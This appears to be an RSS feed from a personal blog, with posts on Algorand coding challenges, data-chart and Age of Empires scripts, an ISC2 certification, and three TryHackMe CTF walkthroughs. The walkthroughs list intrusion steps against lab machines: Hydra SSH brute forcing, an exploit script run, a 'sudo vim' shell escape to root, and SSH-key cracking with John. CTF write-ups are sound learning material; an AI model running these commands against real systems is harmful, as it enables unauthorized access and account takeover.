&lt;p&gt;&lt;code&gt;npm run build&lt;/code&gt; will compile the contract to TEAL and generate an ABI and appspec JSON in &lt;a href=&quot;./contracts/artifacts/&quot;&gt;./contracts/artifacts&lt;/a&gt; and a algokit TypeScript client in &lt;a href=&quot;./contracts/clients/&quot;&gt;./contracts/clients&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;npm run compile-contract&lt;/code&gt; or &lt;code&gt;npm run generate-client&lt;/code&gt; can be used to compile the contract or generate the contract separately.&lt;/p&gt;
&lt;h3&gt;Run Tests&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;npm run test&lt;/code&gt; will execute the tests defined in &lt;a href=&quot;./__test__&quot;&gt;./__test__&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Lint&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;npm run lint&lt;/code&gt; will lint the contracts and tests with ESLint.&lt;/p&gt;
&lt;h2&gt;Solution&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;What was the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;When running&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;npm run test&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I got: &apos;tealscript&apos; is not recognized as an internal or external command, operable program or batch file. Also Visual Studio Code showed that couldn&apos;t find the tealscript module.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;How did you fix the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;According to the &lt;a href=&quot;https://developer.algorand.org/docs/get-details/algokit/features/bootstrap/&quot;&gt;documentation&lt;/a&gt; the AlgoKit Bootstrap feature allows you to bootstrap different project dependencies by looking up specific files in your current directory and immediate sub directories by convention.&lt;/p&gt;
&lt;p&gt;To install these dependencies I run&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;algokit bootstrap all&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;and since it showed there were also some vulnerabilities I run&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;npm audit fix&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://ipfs.algonode.xyz/ipfs/bafkreifq23oojm7gadi467qdn477d66xlyhliwwir25ipwutnl6lm7bdrm?optimizer=image&amp;amp;width=600&quot; alt=&quot;cert&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Algorand Challenge #01: Fix the bug.</title><link>https://alan.com.ar/posts/algochallenge01/</link><guid isPermaLink="true">https://alan.com.ar/posts/algochallenge01/</guid><pubDate>Wed, 06 Mar 2024 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/algorand-coding-challenges/challenge-1/&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt; Challenge 1: I Can&apos;t Send My Transaction! &lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;I want to send 1 ALGO to my friend to show how amazing Algorand is but I can&apos;t send my transaction! what&apos;s wrong???&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Inside of &lt;code&gt;index.ts&lt;/code&gt; file, there is a script that sends a payment transaction that sends 1,000,000 microAlgos (1 ALGO) to the receiver&apos;s wallet. However if you try running the &lt;code&gt;index.ts&lt;/code&gt; file after opening Docker Desktop and then running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;algokit bootstrap all
algokit localnet start
npm run start
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;it will fail and show this error: &lt;code&gt;TypeError: Argument must be byte array&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This repository has the &lt;code&gt;challenge&lt;/code&gt; folder on the root level, which contains the fix the bug challenge codebase.
Find the &lt;code&gt;index.ts&lt;/code&gt; file inside of the &lt;code&gt;challenge&lt;/code&gt; folder and &lt;strong&gt;fix the bug! &lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; Meet other hackers working on this challenge and get help in the &lt;a href=&quot;https://discord.com/channels/491256308461207573/631209194967531559&quot;&gt;JavaScript SDK Discord Channel&lt;/a&gt;!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Checkpoint 1:  Prerequisites&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/tree/main?tab=readme-ov-file#install&quot;&gt;Install AlgoKit&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Install &lt;a href=&quot;https://www.docker.com/products/docker-desktop/&quot;&gt;Docker&lt;/a&gt;. It is used to run a local Algorand network for development.&lt;/li&gt;
&lt;li&gt;Install &lt;a href=&quot;https://docs.npmjs.com/downloading-and-installing-node-js-and-npm&quot;&gt;Node.JS / npm&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Make sure to install these 2 prerequisites before continuing!&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Checkpoint 2:  Set up your development environment&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo&quot;&gt;Fork this repository.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Clone the repository&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;cd [DIRECTORY_OF_YOUR_CHOICE]
git clone [FORKED_REPO_URL]
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;Open the cloned repository with the code editor of your choosing.&lt;/li&gt;
&lt;li&gt;Go into the &lt;code&gt;challenge&lt;/code&gt; directory and run the following in your terminal:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit bootstrap all
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now you are ready to fix the bug!&lt;/p&gt;
&lt;h2&gt;Checkpoint 3:  Fix the bug &lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Open Docker Desktop and launch Algorand localnet by running &lt;code&gt;algokit localnet start&lt;/code&gt; in your terminal &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/features/localnet.md#creating--starting-the-localnet&quot;&gt;For more info click me!&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Make sure you are inside the &lt;code&gt;challenge&lt;/code&gt; directory and run &lt;code&gt;npm run start&lt;/code&gt; in your terminal to run the &lt;code&gt;index.ts&lt;/code&gt; file and see the error message.&lt;/li&gt;
&lt;li&gt;Go to &lt;code&gt;index.ts&lt;/code&gt; file and fix the code to make it work.&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;npm run start&lt;/code&gt; inside of &lt;code&gt;challenge&lt;/code&gt; directory again to run the &lt;code&gt;index.ts&lt;/code&gt; file.
If you see: &lt;code&gt;Payment of 1000000 microAlgos was sent to [receiver&apos;s address]&lt;/code&gt; in the console, you successfully fixed the bug! &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt; Are you struggling?&lt;/strong&gt;
Here is a hint for you: https://developer.algorand.org/docs/sdks/javascript/&lt;/p&gt;
&lt;h2&gt;Checkpoint 4:  Submit your answer&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;After fixing the bug, push your code to your forked Github repo and &lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request-from-a-fork&quot;&gt;make a PR to the original repo.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Inside the PR include:
&lt;ol&gt;
&lt;li&gt;What was the problem?&lt;/li&gt;
&lt;li&gt;How did you solve the problem?&lt;/li&gt;
&lt;li&gt;Screenshot of your terminal showing the logged sentence. &lt;code&gt;Payment of 1000000 microAlgos was sent to [receiver&apos;s address]&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 5:  Claim your certificate of completion NFT! &lt;/h2&gt;
&lt;p&gt;The Algorand Developer Relations team will review the submission and &quot;approve&quot; the PR by labeling it &lt;code&gt;Approved&lt;/code&gt;. Once it&apos;s approved, we will share the magic link to claim your certificate of completion NFT in the comment of the PR!&lt;/p&gt;
&lt;h2&gt;Solution:&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;What was the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Before the transaction is considered valid, it must be signed by a private key. In this case it wasn&apos;t being signed.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;How did you fix the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Following the &lt;a href=&quot;https://developer.algorand.org/docs/sdks/javascript/&quot;&gt;documentation&lt;/a&gt;, I added the code to sign the transaction:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const signedTxn = txn.signTxn(sender.sk);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://ipfs.algonode.xyz/ipfs/bafkreiazf53xittevlukgz7yocdaz6opdjxiimbepu3d7oskots2dlulha?optimizer=image&amp;amp;width=600&quot; alt=&quot;cert&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>ePubLibre data charts.</title><link>https://alan.com.ar/posts/epldatasite/</link><guid isPermaLink="true">https://alan.com.ar/posts/epldatasite/</guid><pubDate>Mon, 26 Feb 2024 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/athekat/EPL-data-website/&quot;&gt;GitHub repository&lt;/a&gt; and the &lt;a href=&quot;https://epldatawebsite.alan.com.ar/&quot;&gt;website&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A webpage that shows Plotly graphs of &lt;a href=&quot;https://www.epublibre.org/&quot;&gt;ePubLibre&lt;/a&gt; data.&lt;/p&gt;
&lt;p&gt;The repository contains a Python script for analyzing book data stored in a CSV file and generating visualizations using Plotly. The CSV file is provided by ePubLibre Library via RSS. The script loads the data from the CSV file, performs analysis, and creates three types of charts:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Bar Chart of Genre Distribution: Visualizes the distribution of books across different genres.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Pie Chart of Language Distribution: Displays the distribution of books based on their language.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Line Chart of Publication Trend: Illustrates the trend of book publications over the years.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Prerequisites&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Python 3.x&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Plotly library (pip install plotly)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The Python script can be found in /assets/charts&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded></item><item><title>Age of Empires II - Most used civilizations (Python Script).</title><link>https://alan.com.ar/posts/aoemostusedciv-python/</link><guid isPermaLink="true">https://alan.com.ar/posts/aoemostusedciv-python/</guid><pubDate>Wed, 07 Feb 2024 08:45:06 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/athekat/AoE---MostUsedCiv/&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A Python script that uses &lt;a href=&quot;https://wiki.librematch.org/steam/start&quot;&gt;LibreMatch API&lt;/a&gt; to output a Plotly pie chart of the civs used.&lt;/p&gt;
</content:encoded></item><item><title>Age of Empires II - Most Recent Match (Python Script).</title><link>https://alan.com.ar/posts/aoemostrecentmatch/</link><guid isPermaLink="true">https://alan.com.ar/posts/aoemostrecentmatch/</guid><pubDate>Tue, 23 Jan 2024 21:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/athekat/Aoe-MostRecentMatch/&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A Python script that uses &lt;a href=&quot;https://wiki.librematch.org/steam/start&quot;&gt;LibreMatch API&lt;/a&gt; to output information about a player&apos;s most recent match in Age Of Empires II DE.&lt;/p&gt;
&lt;p&gt;This script:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. Retrieves match history:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Prompts the user to enter a Steam ID.&lt;/li&gt;
&lt;li&gt;Uses the &lt;code&gt;requests&lt;/code&gt; library to fetch match history data from the Age of Empires 2 API for the specified Steam ID.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;2. Processes the match data:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Focuses on the most recent match played.&lt;/li&gt;
&lt;li&gt;Extracts information about the players involved in the match, including their aliases, civilizations, ELO ratings, and teams.&lt;/li&gt;
&lt;li&gt;Converts timestamps to human-readable publisheds.&lt;/li&gt;
&lt;li&gt;Replaces civilization IDs with their corresponding names for better readability.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;3. Presents the match summary:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Prints the published and map of the most recent match.&lt;/li&gt;
&lt;li&gt;Groups players by their teams and displays their information in a clear format, including aliases, ELOs, and civilizations.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Output:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;images/aoemostrecentmatch/Screenshot.jpg&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Walkthrough: Pickle Rick CTF - TryHackMe.</title><link>https://alan.com.ar/posts/picklerickctf/</link><guid isPermaLink="true">https://alan.com.ar/posts/picklerickctf/</guid><pubDate>Mon, 20 Nov 2023 03:24:52 GMT</pubDate><content:encoded>&lt;h3&gt;A Rick and Morty CTF. Help turn Rick back into a human!&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/picklerick&quot;&gt;Link to the room&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In this ctf we have to find out 3 ingredients for a potion.&lt;/p&gt;
&lt;p&gt;We start by running nmap to find open ports.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$nmap -sV machine-ip
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Results:&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Port Number&lt;/th&gt;
&lt;th&gt;Service Name&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;SSH&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;HTTP&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;I also checked the source code of the web page. It has the username hidden in the html code.&lt;/p&gt;
&lt;p&gt;Then I tried running Hydra to see if I could access via ssh, but it didn&apos;t work.&lt;/p&gt;
&lt;p&gt;After that I ran gobuster to find directories.&lt;/p&gt;
&lt;p&gt;Results:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;/assets&lt;/li&gt;
&lt;li&gt;/index.html&lt;/li&gt;
&lt;li&gt;/robots.txt --&amp;gt; Wubbalubbadubdub --&amp;gt; Maybe this is the pw?&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Then I ran&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$nikito -h machine-ip
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nikto is a free software command-line vulnerability scanner that scans web servers for dangerous files/CGIs, outpublishedd server software and other problems. It performs generic and server type specific checks.&lt;/p&gt;
&lt;p&gt;Results:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/login.php&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The found credentials worked.
From this panel we are able to execute commands.&lt;/p&gt;
&lt;p&gt;Using ls we can see files besides the ones we saw running gobuster.&lt;/p&gt;
&lt;p&gt;Sup3rS3cretPickl3Ingred.txt &amp;lt;-- first ingredient&lt;/p&gt;
&lt;p&gt;We can&apos;t use cat over there, but we can read the files contents with less:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;less Sup3rS3cretPickl3Ingred.txt&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;cd /home; ls -al; pwd&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This will show up as the home folder. We can see there&apos;s a &quot;rick&quot; folder.&lt;/p&gt;
&lt;p&gt;We can see its contents with:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ls /home/rick&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In that folder is located the file giving us the second ingredient.&lt;/p&gt;
&lt;p&gt;Finally for the last ingredient we try to access the root folder. Using&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo -l&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;we can see what privileges we have. It turns out that we can run any command without password.&lt;/p&gt;
&lt;p&gt;So, if we run&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ls /root&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;we won&apos;t get any results.&lt;/p&gt;
&lt;p&gt;But if we run:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo ls /root&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;we can access the directory without any password.&lt;/p&gt;
&lt;p&gt;In this directory is located the last ingredient.&lt;/p&gt;
</content:encoded></item><item><title>Walkthrough: Simple CTF - TryHackMe.</title><link>https://alan.com.ar/posts/simplectf/</link><guid isPermaLink="true">https://alan.com.ar/posts/simplectf/</guid><pubDate>Thu, 16 Nov 2023 03:24:52 GMT</pubDate><content:encoded>&lt;h3&gt;Beginner level ctf.&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/easyctf&quot;&gt;Link to the room&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;As usual, the first step is to run nmap to find open ports.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$nmap -sV machine-ip
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Results:&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Port Number&lt;/th&gt;
&lt;th&gt;Service Name&lt;/th&gt;
&lt;th&gt;Notes&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;21&lt;/td&gt;
&lt;td&gt;FTP&lt;/td&gt;
&lt;td&gt;Anonymous login allowed&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;HTTP&lt;/td&gt;
&lt;td&gt;robots.txt&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2222&lt;/td&gt;
&lt;td&gt;SSH&lt;/td&gt;
&lt;td&gt;Non standard ssh port&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;This will solve the first two questions.&lt;/p&gt;
&lt;p&gt;Then we are asked for the CVE to use against the application.&lt;/p&gt;
&lt;p&gt;I run GoBuster to find out the directories of our target.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$gobuster dir -u http://&apos;machine-ip&apos; -w /usr/share/dirb/wordlists/common.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Results&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;/index&lt;/li&gt;
&lt;li&gt;/simple &amp;lt;--- This one has a Vulnerability&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;The /simple dir has a CVE. I did a bit of googling to find the CVE number, type of attack and exploit.&lt;/p&gt;
&lt;p&gt;Using the exploit I found the username.&lt;/p&gt;
&lt;p&gt;Exploit&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$python3 exploit.py -u http://machine-ip/simple -w list.txt -c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I struggled a bit to run the exploit, got a couple of errors, but I ended up getting the username.&lt;/p&gt;
&lt;p&gt;However, the password took ages and couldn&apos;t get it. Instead I used Hydra:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$hydra -l mitch -P rockyou.txt ssh://machine-ip:2222
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;password found: secret&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;With this information we can log in using ssh.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$ssh mitch@machine-ip -p 2222.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There we find a .txt with the first flag.&lt;/p&gt;
&lt;p&gt;Doing cd we found there&apos;s anothers users folder.&lt;/p&gt;
&lt;p&gt;To get the root flag we need to check what is this allowed run as sudo using sudo -l&lt;/p&gt;
&lt;p&gt;Vim can be run as sudo and without a password.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$sudo vim -c &quot;!sh&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This gives us root privileges.&lt;/p&gt;
&lt;p&gt;We go to the root folder to find the final flag.&lt;/p&gt;
</content:encoded></item><item><title>ISC2 Certified in Cybersecurity (CC).</title><link>https://alan.com.ar/posts/isc2cc/</link><guid isPermaLink="true">https://alan.com.ar/posts/isc2cc/</guid><pubDate>Wed, 15 Nov 2023 04:12:32 GMT</pubDate><content:encoded>&lt;p&gt;ISC2 &lt;a href=&quot;https://www.isc2.org/certifications/cc&quot;&gt;Certified in Cybersecurity&lt;/a&gt; is a foundational cybersecurity certification designed to help recipients build a pathway to a rewarding career in cybersecurity. This entry-level certification will prove to employers you have the foundational knowledge, skills and abilities necessary for an entry- or junior-level cybersecurity role. It proves your willingness and ability to learn and grow on the job.&lt;/p&gt;
&lt;p&gt;There are five domains to this certification:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Security Principles&lt;/li&gt;
&lt;li&gt;Business Continuity (BC), Disaster Recovery (DR) &amp;amp; Incident Response Concepts&lt;/li&gt;
&lt;li&gt;Access Controls Concepts&lt;/li&gt;
&lt;li&gt;Network Security&lt;/li&gt;
&lt;li&gt;Security Operations&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To this published ISC2 is offering FREE Certified in Cybersecurity (CC) Online Self-Paced Training and exams to one million people. Visit the &lt;a href=&quot;https://www.isc2.org/Landing/1MCC&quot;&gt;site&lt;/a&gt; to learn more.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Some of the resources I used to prepare for the exam are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;https://www.udemy.com/course/certifiedincybersecurity/&quot;&gt;ThorTeaches Udemy Course&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;https://jesilicht.notion.site/Jesi-s-ISC-Certified-in-Cybersecurity-1c121b31da64486c9a9915caf2320dff&quot;&gt;Jesi&apos;s Summary&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;https://play.google.com/store/apps/details?id=com.examprepinc.iscccexamprep&amp;amp;pcampaignid=web_share&quot;&gt;This app&lt;/a&gt; that gives mock exams to practice. Beware it&apos;s full of ads though.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=usr4-wvaTXs&amp;amp;list=PLp0Kqt2EWTuGSAydNzCjBA2Brsz4E6keC&amp;amp;index=4&quot;&gt;Youtube video&lt;/a&gt; with plenty of questions.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;https://www.isc2.org/Training/Self-Study-Resources/CC/chapter-1&quot;&gt;ICS2 flashcards&lt;/a&gt; to study the terms.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Gladly last week I took the exam, passed and got my &lt;a href=&quot;https://www.credly.com/badges/576278cc-0ea9-4ecc-a1cc-0e7040ffebae&quot;&gt;certification&lt;/a&gt;.&lt;/p&gt;
</content:encoded></item><item><title>Walkthrough: Basic Pentesting - TryHackMe.</title><link>https://alan.com.ar/posts/basicpentesting/</link><guid isPermaLink="true">https://alan.com.ar/posts/basicpentesting/</guid><pubDate>Sun, 12 Nov 2023 03:24:52 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/basicpentestingjt&quot;&gt;Link to the room&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In this set of tasks we&apos;ll be using:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Brute forcing&lt;/li&gt;
&lt;li&gt;Hash cracking&lt;/li&gt;
&lt;li&gt;Service enumeration&lt;/li&gt;
&lt;li&gt;Linux Enumeration&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first task is to find the services exposed by the machine. We need to use nmap:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$nmap -sC -sV ip-address
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Results:&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Port Number&lt;/th&gt;
&lt;th&gt;Service Name&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;SSH&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;HTTP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;139&lt;/td&gt;
&lt;td&gt;SAMBA&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;445&lt;/td&gt;
&lt;td&gt;SAMBA&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8009&lt;/td&gt;
&lt;td&gt;APACHE Jserv&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8080&lt;/td&gt;
&lt;td&gt;APACHE Tomcat&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;Then we are asked for the name of the hidden directory on the web server. To look for hidden directories we use dirbuster or gobuster:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u ip-address
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This will give us the hidden dir.&lt;/p&gt;
&lt;p&gt;After thar we need to find our way to User to find the username &amp;amp; password. Back in nmap we find out that samba services are running, so we use enum4linux to find the usernames.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$enum4linux -a ip-address
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As a result we gain the usernames. To find the password we run Hydra with rockyou.txt as a password list.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://ip-address
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With these credentials we&apos;ll be able to log-in via ssh.&lt;/p&gt;
&lt;p&gt;To enumerate vulnerabilities and privilege escalations we can use &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&quot;&gt;linPEAS&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We can use the scp command to copy files between a local and a remote system, so we&apos;ll be using that to copy linPeas to the target machine.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$scp localFileDir user@ip-address:remoteFileDir
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This will find the Private SSH RSA key found for Kay. We cat this private key file. However, the private key is password protected. We can use JohnTheRipper to brute force the password. First we run ssh2john.py and then we run john. Using JohnTheRipper and rockyou.txt will give us the other user&apos;s password, and this user we have access to the flag to terminate the ctf.&lt;/p&gt;
